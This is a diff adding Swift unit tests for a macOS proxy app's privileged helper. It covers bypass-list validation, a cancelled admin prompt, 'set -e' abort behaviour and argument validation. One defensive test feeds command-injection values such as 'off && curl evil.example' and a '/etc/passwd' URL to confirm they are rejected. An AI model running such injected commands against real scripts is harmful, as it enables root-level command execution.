@@ -259,6 +259,22 @@ final class HelperContractTests: XCTestCase {
         XCTAssertTrue(HelperInputValidator.validateProxyBypassEntry("10.0.0.1"))
     }
 
+    /// The shipped `routing.noProxyHosts` default is the input this validator
+    /// sees most often, and it has to pass. A bracketed IPv6 literal failed the
+    /// character class, so on any machine where `networksetup` needs admin
+    /// rights a stock install could not apply the proxy at all — and a bypass
+    /// list captured off such a machine could not be restored either.
+    func testValidateProxyBypassEntryAcceptsTheShippedDefaultList() {
+        for entry in RoutingSection().noProxyHosts {
+            XCTAssertTrue(
+                HelperInputValidator.validateProxyBypassEntry(entry),
+                "the default bypass list must survive its own validator: \(entry)"
+            )
+        }
+        XCTAssertTrue(HelperInputValidator.validateProxyBypassEntry("[::1]"))
+        XCTAssertTrue(HelperInputValidator.validateProxyBypassEntry("[fe80::1]"))
+    }
+
     func testValidateProxyBypassEntryRejectsArgumentInjection() {
         // These reach networksetup as argv, so a leading dash is the one shape
         // that changes what the command does.
@@ -336,6 +352,88 @@ final class HelperContractTests: XCTestCase {
         XCTAssertTrue(script.contains("-setwebproxystate 'Wi-Fi' off"))
     }
 
+    /// The failure this exists to stop. `osascript` exits 1 when the user
+    /// dismisses the password dialog, and
+    /// `CommandRunner.runPrivilegedShellScript` reports that as an ordinary
+    /// `CommandResult` rather than throwing. Discarding it made a cancelled
+    /// prompt look exactly like a completed restore, and `SystemProxyManager`
+    /// then dropped the records holding the user's real proxy settings.
+    func testCancelledAdminPromptIsAFailureNotASuccess() {
+        let cancelled = CommandResult(
+            exitCode: 1,
+            standardOutput: "",
+            standardError: "execution error: User canceled. (-128)"
+        )
+        let client = AppleScriptPrivilegeClient(runner: { _ in cancelled })
+
+        XCTAssertThrowsError(try client.execute(.clearSystemProxy, values: ["Wi-Fi"])) { error in
+            XCTAssertTrue(
+                error.displayDescription.contains("User canceled"),
+                "the reason the elevation failed has to survive to the caller: \(error)"
+            )
+        }
+        XCTAssertThrowsError(
+            try client.execute(batch: [PrivilegedBatchStep(.setAutoproxy, ["Wi-Fi", "", "off"])])
+        )
+    }
+
+    func testSuccessfulPrivilegedScriptDoesNotThrow() throws {
+        let client = AppleScriptPrivilegeClient(
+            runner: { _ in CommandResult(exitCode: 0, standardOutput: "", standardError: "") }
+        )
+        try client.execute(.clearSystemProxy, values: ["Wi-Fi"])
+        try client.execute(batch: [PrivilegedBatchStep(.setAutoproxy, ["Wi-Fi", "", "off"])])
+    }
+
+    /// `sh` reports only the last command's status, so a batch whose first
+    /// write failed still exited 0. Every step here is an absolute set, so
+    /// aborting and retrying the whole sequence is the safe behaviour.
+    func testPrivilegedScriptsAbortOnTheFirstFailedCommand() throws {
+        let recorder = RecordingPrivilegedScriptRunner()
+        let client = AppleScriptPrivilegeClient(runner: recorder.run)
+
+        try client.execute(batch: [
+            PrivilegedBatchStep(.setAutoproxy, ["Wi-Fi", "", "off"]),
+            PrivilegedBatchStep(.setWebProxyEndpoint, ["Wi-Fi", "web", "", "", "off"]),
+        ])
+        try client.execute(.clearSystemProxy, values: ["Wi-Fi"])
+
+        for script in recorder.scripts {
+            XCTAssertTrue(
+                script.hasPrefix("set -e\n"),
+                "a multi-command privileged script that ignores every status but the last cannot report a failure: \(script)"
+            )
+        }
+    }
+
+    /// `AppleScriptPrivilegeClient` is the default `privilegeClient` for
+    /// `SystemProxyManager`, and these two operations interpolate `state` into
+    /// a script that runs as root. The helper-client path validated first; this
+    /// one validated nothing, so it was the unguarded way in.
+    func testAppleScriptRendererValidatesTheArgumentsItInterpolatesAsRoot() {
+        let client = AppleScriptPrivilegeClient()
+
+        XCTAssertThrowsError(
+            try client.shellScript(for: .setWebProxyEndpoint, values: ["Wi-Fi", "web", "", "", "off; touch /tmp/pwned"])
+        )
+        XCTAssertThrowsError(
+            try client.shellScript(for: .setAutoproxy, values: ["Wi-Fi", "", "off && curl evil.example"])
+        )
+        XCTAssertThrowsError(
+            try client.shellScript(for: .setWebProxyEndpoint, values: ["Wi-Fi", "sideways", "", "", "off"])
+        )
+        XCTAssertThrowsError(
+            try client.shellScript(for: .setWebProxyEndpoint, values: ["Wi-Fi", "web", "old.example", "0", "on"])
+        )
+        XCTAssertThrowsError(
+            try client.shellScript(for: .setAutoproxy, values: ["Wi-Fi", "file:///etc/passwd", "on"])
+        )
+
+        // The forms restore actually renders still pass.
+        XCTAssertNoThrow(try client.shellScript(for: .setWebProxyEndpoint, values: ["Wi-Fi", "web", "Empty", "", "off"]))
+        XCTAssertNoThrow(try client.shellScript(for: .setAutoproxy, values: ["Wi-Fi", "http://mdm.corp.example/a.pac", "off"]))
+    }
+
     // MARK: - HelperBinaryLocator
 
     func testLocatorReturnsNilWhenNotBundled() {
@@ -346,5 +444,17 @@ final class HelperContractTests: XCTestCase {
         if let path {
             XCTAssertFalse(path.isEmpty)
         }
+    }
+}
+
+/// Stands in for the real elevation, which raises a password prompt and so can
+/// never run under test.
+private final class RecordingPrivilegedScriptRunner: @unchecked Sendable {
+    private(set) var scripts: [String] = []
+    var result = CommandResult(exitCode: 0, standardOutput: "", standardError: "")
+
+    func run(_ script: String) throws -> CommandResult {
+        scripts.append(script)
+        return result
     }
 }
